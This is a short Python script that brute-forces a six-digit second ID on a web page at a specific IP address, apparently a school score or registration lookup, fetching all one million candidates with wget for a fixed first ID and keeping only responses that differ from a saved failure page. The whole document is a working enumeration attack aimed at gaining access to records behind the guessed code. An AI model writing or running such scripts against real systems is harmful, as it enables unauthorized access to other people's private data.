#008110
import subprocess
import filecmp
import os
for i in range(1000000):
    t=str(i).zfill(6)
    get="http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1420622&ID2="+t
    subprocess.run(['wget', get, '-O', t+'.html'])
    if filecmp.cmp(t+'.html', "python/others/cc.html"):
        os.remove(t+'.html')